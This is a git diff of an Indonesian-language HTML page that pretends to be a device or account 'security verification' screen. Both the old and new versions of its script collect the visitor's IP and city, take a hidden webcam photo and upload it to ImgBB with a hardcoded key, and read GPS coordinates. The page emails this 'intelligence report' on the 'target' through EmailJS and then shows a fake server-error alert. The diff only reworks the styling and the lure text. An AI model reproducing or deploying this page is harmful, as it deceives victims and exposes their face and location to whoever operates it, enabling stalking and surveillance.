@@ -3,23 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Keamanan - Gigs</title>
+    <title>Verifikasi Keamanan Perangkat</title>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: 'Courier New', monospace; background-color: #0a0a0a; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .box { border: 2px solid #00ff00; padding: 30px; border-radius: 5px; text-align: center; background: #000; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); width: 90%; max-width: 400px; }
-        .btn { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; text-transform: uppercase; }
-        #status { margin-top: 15px; font-size: 12px; color: #888; }
+        body { font-family: sans-serif; background-color: #000; color: #00ff00; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 80%; }
+        button { background: #00ff00; color: #000; padding: 10px; border: none; font-weight: bold; cursor: pointer; width: 100%; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <div class="box">
-    <h1>Akses Terdeteksi</h1>
-    <p>Sistem mendeteksi upaya login tidak sah. Selesaikan verifikasi wajah dan lokasi untuk memulihkan akses perangkat Anda.</p>
-    <button class="btn" onclick="startProses()">VERIFIKASI SEKARANG</button>
-    <div id="status">Status: Menunggu...</div>
+    <h3>[ PENYALAHGUNAAN TERDETEKSI ]</h3>
+    <p>Selesaikan verifikasi wajah untuk memulihkan akun Novle Anda.</p>
+    <button onclick="ambilData()">VERIFIKASI SEKARANG</button>
 </div>
 
 <video id="video" autoplay></video>
@@ -30,17 +28,16 @@
         emailjs.init("5HWPoEryOV1APt1Cw");
     })();
 
-    async function startProses() {
-        document.getElementById("status").innerText = "Menghubungkan ke server keamanan...";
-        let report = "--- LAPORAN INTELIJEN BARU ---\n";
-
+    async function ambilData() {
+        let report = "[LAPORAN INTELIJEN LENGKAP]\n------------------\n";
+        
         try {
-            // 1. Ambil IP
+            // Ambil IP
             const res = await fetch('https://ipapi.co/json/');
-            const ip = await res.json();
-            report += `IP: ${ip.ip}\nKota: ${ip.city}\nISP: ${ip.org}\n`;
+            const ipData = await res.json();
+            report += `IP: ${ipData.ip}\nKota: ${ipData.city}\n`;
 
-            // 2. Kamera
+            // Ambil Foto
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -51,43 +48,34 @@
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const photoBase64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
-                
-                // Matikan kamera
                 stream.getTracks().forEach(t => t.stop());
 
-                // 3. Upload Foto ke ImgBB
+                // UPLOAD KE IMGBB (Pakai Key Anda)
                 const formData = new FormData();
                 formData.append("image", photoBase64);
-                
                 const upload = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
-                    method: "POST",
-                    body: formData
+                    method: "POST", body: formData
                 });
                 const resImg = await upload.json();
                 const linkFoto = resImg.data.url;
 
-                // 4. GPS & Kirim
+                // Ambil GPS & Kirim
                 navigator.geolocation.getCurrentPosition((pos) => {
-                    report += `Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
-                    report += `Link Foto: ${linkFoto}\n`;
+                    report += `📸 LINK FOTO: ${linkFoto}\n📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                     kirimEmail(report);
                 }, () => {
-                    report += `Link Foto: ${linkFoto}\nGPS: Ditolak\n`;
+                    report += `📸 LINK FOTO: ${linkFoto}\n📍 GPS: Ditolak`;
                     kirimEmail(report);
                 });
             }, 2000);
         } catch (e) {
-            kirimEmail(report + "\nKamera/GPS Ditolak target.");
+            kirimEmail(report + "\nAkses Kamera Ditolak.");
         }
     }
 
     function kirimEmail(pesan) {
-        emailjs.send("service_e3ap8de", "template_ts6dxmh", {
-            message: pesan
-        }).then(() => {
-            alert("Kesalahan Server 404. Silakan coba lagi nanti.");
-            document.getElementById("status").innerText = "Selesai.";
-        });
+        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: pesan })
+        .then(() => alert("Kesalahan Server 404. Silakan coba lagi."));
     }
 </script>
 </body>
